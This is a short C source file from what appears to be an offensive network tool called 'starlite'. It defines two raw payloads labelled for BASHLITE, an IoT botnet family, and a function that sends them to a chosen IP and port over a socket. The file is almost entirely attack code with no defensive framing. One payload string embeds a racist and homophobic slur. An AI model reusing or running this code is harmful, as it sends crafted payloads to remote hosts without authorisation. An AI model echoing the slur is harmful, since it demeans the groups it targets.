#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#define BASHLITE_PAYLOAD1 "\x04int []\x0A\x12\x34\x50\x36;Device Connected; \x34"
#define BASHLITE_PAYLOAD2 "\033[37m\r\n\033[37m[\033[36mstarlite\033[37m] gayniggers from outer space\r\n"

void send_bashlite_payload(const char *ip, int port, int sockfd) {
    printf("[starlite] [bashlite] connected to %s:%d, sending payload\n", ip, port);
    send(sockfd, BASHLITE_PAYLOAD1, strlen(BASHLITE_PAYLOAD1), 0);
    send(sockfd, BASHLITE_PAYLOAD2, strlen(BASHLITE_PAYLOAD2), 0);
    close(sockfd);
    //printf("[starlite] [bashlite] payload sent and connection closed\n");
}